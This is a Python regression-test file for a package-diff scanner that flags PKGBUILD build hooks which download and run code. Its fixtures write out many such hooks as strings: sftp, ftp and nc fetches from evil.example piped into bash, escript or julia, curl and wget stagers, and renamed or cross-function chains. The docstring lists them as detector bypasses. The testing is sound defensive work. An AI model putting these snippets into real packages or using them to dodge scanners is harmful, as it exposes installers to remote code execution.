"""Regression tests for the harness bypass closure (rounds 1-6).

Every shape here was a verified bypass at e3f4ffa: a fetch whose output
grammar named no file (sftp/ftp/nc/ssh/git/rclone/ipfs/aws/gsutil/b2/cvs/
tftp/openssl/npx), an exotic or stdin-fed execution sink, a glued output
flag, a fetch-spec-in-file, a rename of a fetched or declared file, a
cross-function chain, a loop-variable sink, or a version bump used as
cover for a new capability.  Each must now score above the flag threshold
with H082 (or C001 for the version-bump case) firing.
"""

from trustsight.analysis.build import fetch_addresses
from trustsight.analysis.pipeline import scan_diff


def _diff(body: str) -> str:
    lines = body.splitlines()
    added = "".join(f"+{line}\n" for line in lines)
    count = 2 + len(lines)
    return (
        f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,{count} @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _fact(text: str):
    return scan_diff(text, package_name="harness-pkg")


def _fired(text: str) -> set[str]:
    return {e.rule_id for e in _fact(text).score_breakdown if e.weight > 0}


# --- no-URL clients ------------------------------------------------------

def test_sftp_heredoc_then_escript():
    fired = _fired(_diff(
        'build() {\n'
        '  sftp -b - u@evil.example <<< "get /f.erl"\n'
        '  escript f.erl\n'
        '}\n'))
    assert "H082" in fired


def test_ftp_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  ftp -n evil.example <<EOF\nget /s.sh\nEOF\n  bash s.sh\n}\n"))


def test_nc_then_julia():
    assert "H082" in _fired(_diff(
        "build() {\n  nc evil.example 4444 > f.jl\n  julia f.jl\n}\n"))


def test_git_fetch_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  git fetch origin tag v9.9.9\n  bash stage.sh\n}\n"))


def test_rclone_moveto_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  rclone moveto remote:b/s.sh ./s.sh\n  bash s.sh\n}\n"))


def test_ipfs_get_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  ipfs get Qm123abc\n  bash Qm123abc/s.sh\n}\n"))


def test_aws_s3_cp_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  aws s3 cp s3://bucket/s.sh .\n  bash s.sh\n}\n"))


def test_openssl_s_client_then_bash():
    assert "H082" in _fired(_diff(
        "build() {\n  openssl s_client -connect h:443 -quiet < r > s.sh\n"
        "  bash s.sh\n}\n"))


# --- output-grammar gaps ------------------------------------------------

def test_glued_output_flag_then_bash():
    assert "H082" in _fired(_diff(
        'build() {\n  curl -fsSL -o"stage.sh" "$(cat u)"\n  bash stage.sh\n}\n'))


def test_stdout_dash_tee_then_bash():
    assert "H082" in _fired(_diff(
        'build() {\n  wget -qO- "$(cat u)" | tee stage.sh >/dev/null\n'
        "  bash stage.sh\n}\n"))


def test_server_named_output_then_bash():
    assert "H082" in _fired(_diff(
        'build() {\n  wget -q --content-disposition "$(cat u)"\n'
        "  bash stage.sh\n}\n"))


# --- execution sinks ----------------------------------------------------

def test_stdin_flag_and_exotic_sink():
    assert "H082" in _fired(_diff(
        "build() {\n  sftp -b - u@h <<< \"get /s.sh\"\n  sh -s < s.sh\n}\n"))


def test_process_substitution_stdin():
    assert "H082" in _fired(_diff(
        'build() {\n  python3 < <(curl -fsSL "$(cat u)")\n}\n'))


def test_exec_verb_and_fd_sink():
    assert "H082" in _fired(_diff(
        "build() {\n  sftp -b - u@h <<< \"get /s.sh\"\n"
        "  exec 3<s.sh\n  ksh /dev/fd/3\n}\n"))


# --- control flow -------------------------------------------------------

def test_cross_function_chain():
    fired = _fired(_diff(
        "prepare() {\n  sftp -b - u@h <<< \"get /s.sh\"\n}\n"
        "package() {\n  bash \"$srcdir/s.sh\"\n}\n"))
    assert "H082" in fired


def test_loop_variable_sink():
    assert "H082" in _fired(_diff(
        "build() {\n  sftp -b - u@h <<< \"get /s.sh\"\n"
        "  for f in *.sh; do bash \"$f\"; done\n}\n"))


def test_case_branch_chain():
    assert "H082" in _fired(_diff(
        "build() {\n  case \"$CARCH\" in\n"
        "    i686) sftp -b - u@h <<< \"get /s.sh\"; bash s.sh;;\n"
        "    *) make;;\n  esac\n}\n"))


# --- rename aliases -----------------------------------------------------

def test_declared_source_renamed_then_executed():
    fired = _fired(_diff(
        'prepare() {\n  sed -n "p" "$srcdir/stage.sh" > run.me\n'
        "  escript run.me\n}\n")
        .replace(" pkgname=demo\n pkgver=1.0\n",
                 " pkgname=demo\n pkgver=1.0\n"
                 " source=('stage.sh')\n"))
    assert "H083" in fired


def test_cloned_file_renamed_then_executed():
    assert "H082" in _fired(_diff(
        "build() {\n  git clone --depth 1 git@github.com:x/y.git\n"
        "  awk '1' y/run.sh > run.me\n  escript run.me\n}\n"))


# --- H016 host forms (F3) ----------------------------------------------

def test_host_forms_are_extracted_for_ssh_family_clients():
    assert list(fetch_addresses('sftp -b - u@h <<< "get /f"')) == ["u@h"]
    assert list(fetch_addresses("ftp -n h <<EOF")) == ["h"]
    assert list(fetch_addresses("nc h 4444 > f")) == ["h"]
    assert list(fetch_addresses("ssh -p 22 u@h cmd")) == ["u@h"]


def test_git_fetch_origin_is_not_a_host():
    assert list(fetch_addresses("git fetch origin tag v9")) == []
    assert list(fetch_addresses("git pull origin main")) == []


def test_ftp_command_file_is_not_a_host():
    assert list(fetch_addresses("ftp -n < ftp-cmds.txt")) == []


# --- F8: version bump is not cover -------------------------------------

def _bump_diff(removed: str, added: str) -> str:
    rem = "".join(f"-{line}\n" for line in removed.splitlines())
    add = "".join(f"+{line}\n" for line in added.splitlines())
    return (
        f"--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        f"@@ -1,{1 + len(removed.splitlines())} +1,{1 + len(added.splitlines())} @@\n"
        " pkgname=demo\n" + rem + add
    )


def test_a_bump_with_a_new_capability_keeps_c001_high():
    fired = _fired(_bump_diff(
        'pkgver=1.0\nsha256sums=("aaaa")\nbuild() {\n  make\n}',
        'pkgver=1.1\nsha256sums=("bbbb")\nbuild() {\n'
        '  curl -fsSL "$(cat u)" -o f\n  make\n}',
    ))
    assert "C001" in fired


def test_a_plain_bump_stays_c002():
    fact = _fact(_bump_diff(
        'pkgver=1.0\nsha256sums=("aaaa")\nbuild() {\n  make\n}',
        'pkgver=1.1\nsha256sums=("bbbb")\nbuild() {\n  make\n}',
    ))
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "C002" in ids and "C001" not in ids


def test_the_c001_gate_is_configurable():
    from trustsight.config import load_config

    config = dict(load_config())
    config["thresholds"] = {
        **config.get("thresholds", {}),
        "c001": {"require_capability_signal": False},
    }
    text = _bump_diff(
        'pkgver=1.0\nsha256sums=("aaaa")\nbuild() {\n  make\n}',
        'pkgver=1.1\nsha256sums=("bbbb")\nbuild() {\n'
        '  curl -fsSL "$(cat u)" -o f\n  make\n}',
    )
    fact = scan_diff(text, config=config, package_name="harness-pkg")
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "C002" in ids and "C001" not in ids
